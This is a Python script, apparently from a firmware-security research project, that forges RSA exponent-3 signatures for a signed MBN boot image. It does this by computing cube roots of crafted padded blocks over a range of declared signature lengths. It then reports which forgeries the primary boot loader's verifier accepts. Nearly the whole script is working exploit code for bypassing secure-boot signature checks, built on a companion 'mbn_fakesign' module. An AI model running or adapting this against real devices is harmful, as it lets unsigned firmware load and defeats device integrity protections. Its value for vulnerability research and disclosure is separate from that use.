#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sweep the usable range of L (the declared signature length) against a real image
and confirm four things:
  1. s^3 < n is the real hard cap (e*8L < log2 n)
  2. the digest must be odd (otherwise no cube root exists mod 2^k)
  3. L does not have to be a multiple of 4 -- the PBL never reads the top 1..3 bytes
  4. the PBL only demands 5 0xFF bytes of padding, looser than PKCS#1's 8-byte floor

Usage:
    python l_sweep.py <image.mbn> [sw_id_hex] [hw_id_hex]
e.g.
    python l_sweep.py firehose_signed.mbn 0000000000000003 008150E100150017
"""
import importlib.util
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "m", os.path.join(HERE, "mbn_fakesign.py"))
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

path = sys.argv[1] if len(sys.argv) > 1 else "firehose_signed.mbn"
sw = sys.argv[2] if len(sys.argv) > 2 else "0000000000000003"
hw = sys.argv[3] if len(sys.argv) > 3 else "008150E100150017"

buf = open(path, "rb").read()
hdr = m.MbnHeader.read(buf)
certs = m.extract_certs(buf, hdr)
n, e = m.x509_pubkey(certs[0])
code = buf[hdr.file_off(hdr.load_addr):][:hdr.code_size]
cert_store = buf[hdr.file_off(hdr.cert_addr):][:hdr.cert_len]
load = hdr.load_addr
algo = m.detect_hash(certs[0])
key1 = bytes.fromhex(sw)   # inner 0x36 key
key2 = bytes.fromhex(hw)   # outer 0x5c key

print("image: %s" % path)
print("leaf: n %d bits, e = %d, %s" % (n.bit_length(), e, algo))
print("code %d bytes, cert store %d bytes" % (len(code), len(cert_store)))
print("hard cap: e*8L < log2 n  ->  L < %.2f" % (n.bit_length() / (8.0 * e)))
print()


def build_T(d3, L):
    """Lay out the EM the way the PBL reads it, without assuming L is a multiple of 4.

    v68[j] = EM[255-j], so the L-byte window is buf[0..L-1] with buf[0] the lowest
    byte. The top word that gets checked is buf[align-4 .. align-1] where
    align = 4*(L>>2) <= L. When L is not a multiple of 4, the bytes
    buf[align .. L-1] are never read by the PBL at all.
    """
    hl = len(d3)
    align = 4 * (L >> 2)
    if align - 4 < hl + 1:          # no room left for padding between digest and top word
        return None
    b = bytearray(L)
    b[0:hl] = d3[::-1]              # digest sits at the very bottom (lowest byte)
    b[hl] = 0x00                    # separator
    for i in range(hl + 1, align - 4):
        b[i] = 0xFF
    b[align - 4] = 0xFF             # top word = 00 01 FF FF (reads as 0x0001FFFF little-endian)
    b[align - 3] = 0xFF
    b[align - 2] = 0x01
    b[align - 1] = 0x00
    return int.from_bytes(bytes(b), "little")


def nff(L, hl):
    """How many 0xFF bytes this L actually leaves: from the separator up to the top word."""
    align = 4 * (L >> 2)
    return align - hl - 3


print("%-4s %-6s %-10s %-9s %-6s %s" % ("L", "D3[-1]", "s^3 bits", "s^3<n", "0xFFs", "PBL"))
print("-" * 62)
for L in range(38, 90):
    h = m.MbnHeader(bytes(hdr.raw), hdr.base)
    h.set(load_addr=load, code_size=len(code), sig_addr=load + len(code),
          sig_len=L, cert_addr=load + len(code) + L,
          cert_len=len(cert_store),
          body_size=len(code) + L + len(cert_store))
    _d1, _d2, d3 = m.image_digest(h.raw, code, key1, key2, algo)

    if d3[-1] % 2 == 0:
        print("%-4d %-6s %-10s %-9s %-6s %s"
              % (L, d3.hex()[-2:], "-", "-", "-",
                 "skipped: digest even, no cube root mod 2^k"))
        continue

    T = build_T(d3, L)
    if T is None:
        print("%-4d %-6s %-10s %-9s %-6s %s"
              % (L, d3.hex()[-2:], "-", "-", "-", "no room for digest+padding"))
        continue

    k = 8 * L
    d = pow(e, -1, 1 << (k - 1))     # |(Z/2^k)^*| = 2^(k-1); 3 is invertible there
    s = pow(T, d, 1 << k)
    assert pow(s, e, 1 << k) == T

    nbytes = n.to_bytes(256, "big")
    ok, rc = m.pbl_verify_signature(nbytes, b"\x03", s.to_bytes(L, "big"), d3)
    bits = (s.bit_length()) * e
    print("%-4d %-6s %-10d %-9s %-6d %s"
          % (L, d3.hex()[-2:], bits, "yes" if pow(s, e) < n else "no",
             nff(L, len(d3)),
             "ACCEPTED" if ok else "rejected %d (%s)" % (rc, m.FAIL.get(rc, "?"))))
